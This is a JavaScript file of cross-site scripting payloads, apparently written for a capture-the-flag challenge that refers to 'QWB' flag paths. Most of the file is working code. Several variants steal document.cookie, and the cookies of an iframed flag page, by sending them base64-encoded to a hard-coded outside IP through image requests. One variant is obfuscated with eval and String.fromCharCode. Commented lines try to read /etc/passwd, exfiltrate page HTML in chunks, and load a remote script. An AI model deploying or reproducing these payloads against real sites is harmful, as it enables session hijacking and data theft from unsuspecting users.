function fff(data){
    var s=window.document.createElement("img");
    s.src="http://208.167.248.132/?x="+btoa(document.cookie);
    window.document.body.appendChild(s);
}
fff();






// window.open("http://208.167.248.132","_blank");
// window.open("file:///etc/passwd","_blank");

// document.cookie="flag=QWB{Th1s_l5_n0!_fl49}";

// fff("emmmmmmmm");
// fff(document.cookie);

// var h = escape(document.body.innerHTML);
// var v = h.length/100;
// for (var i = 0; i <= h.length/100; i++) {
//     fff( h.substr( 200*i, 100 ) );
// }

var ff=document.createElement("iframe");
var s=window.document.createElement("img");
ff.setAttribute("src","/QWB_fl4g/QWB/");
ff.onload=function () {
    setTimeout(function () {
        console.log(ff.contentDocument.cookie);
        s.src="http://208.167.248.132/?x="+btoa(ff.contentDocument.cookie);
        document.body.appendChild(s);
    }, 0);
};
document.body.appendChild(ff);


var c=document.createElement,a=document.body.appendChild,f=c("iframe");var s=c("img");f.setAttribute("src","/QWB_fl4g/QWB/");f.onload=function(){setTimeout(function(){s.src="http://208.167.248.132/?x="+btoa(f.contentDocument.cookie);a(s)},0)};a(f);

var d=document,b=d.body,x=d.createElement("iframe"),s=d.createElement("img");x.setAttribute("src","/QWB_fl4g/QWB/");x.onload=function(){setTimeout(function(){s.src="http://208.167.248.132/?x="+btoa(x.contentDocument.cookie);b.appendChild(s)},0)};b.appendChild(x);

eval(String.fromCharCode(118,97,114,32,102,102,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,118,97,114,32,115,61,119,105,110,100,111,119,46,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,109,103,34,41,59,102,102,46,115,101,116,65,116,116,114,105,98,117,116,101,40,34,115,114,99,34,44,34,47,81,87,66,95,102,108,52,103,47,81,87,66,47,34,41,59,102,102,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,115,101,116,84,105,109,101,111,117,116,40,102,117,110,99,116,105,111,110,40,41,123,99,111,110,115,111,108,101,46,108,111,103,40,102,102,46,99,111,110,116,101,110,116,68,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59,115,46,115,114,99,61,34,104,116,116,112,58,47,47,50,48,56,46,49,54,55,46,50,52,56,46,49,51,50,47,63,120,61,34,43,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,125,44,48,41,125,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,102,102,41,59));



// s=document.createElement("script");
// s.src="http://208.167.248.132:8000/b/1";
// document.body.appendChild(s);